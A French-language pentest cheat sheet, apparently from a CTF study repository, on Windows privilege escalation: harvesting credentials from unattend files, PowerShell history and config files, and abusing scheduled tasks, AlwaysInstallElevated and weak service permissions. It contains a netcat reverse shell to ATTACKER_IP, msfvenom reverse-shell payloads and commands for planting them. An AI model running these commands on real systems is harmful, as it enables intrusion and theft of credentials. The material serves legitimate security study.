# Windows

Quelques sources possibles d'escalation de privilèges sous windows

### Unattended Windows Installations

Avec MDT:
```
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
```

Peut contenir :

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>domain.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History

cmd.exe
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

powershell.exe
```
cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials

```
cmdkey /list
```

En cas de trouvaille interressante 
```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration

web.config
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### PuTTY

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

# Autres Techniques

### Planificateur de tâches
Pour lister les tâches planifiées : `schtasks` 

```
schtasks /query /tn vulntask /fo list /v
```
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
Pour obtenir des infos sur `Task To Run`

```
icacls c:\tasks\schtask.bat
```
```
C:\> icacls c:\tasks\schtask.bat
C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

#### Exploitation

Détectable par les antivirus !
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

#### Exécution manuelle

```
schtasks /run /tn vulntask
```

### AlwaysInstallElevated

Exploitation de .msi :
Vérifier si ces deux sont présents
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

si oui
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.147.119 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Insecure Permissions on Service Executable

```
sc qc WindowsScheduler
```
```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Check des permissions

```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
```
C:\Users\unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Création du payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
Démarrage d'un serveur http avec python
```
python3 -m http.server
```

Côté victime (Powershell)
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
(cmd)
```
move WService.exe WService.exe.bkp
move C:\Users\unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F

(activé un listener côté attaquant)
sc stop windowsscheduler
sc start windowsscheduler
```
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.

### Unquoted Service Paths

```
sc qc "disk sorter enterprise"
```

```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/1b70be9e-8275-4d50-86cc-2913795f3829)

Si `C:\MyPrograms\Disk` n'existe pas, alors le programme ira chercher `C:\MyPrograms\Disk Sorter.exe` sinon -> `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`.

```
icacls c:\MyPrograms
```
```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
Création du payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
Démarrage d'un serveur http avec python
```
python3 -m http.server
```

Côté victime (Powershell)
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
(cmd)
```
move C:\Users\unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls Disk.exe /grant Everyone:F

(activé un listener côté attaquant)
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

### Insecure Service Permissions

Utilisation de <href a="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"> accesschk</a>
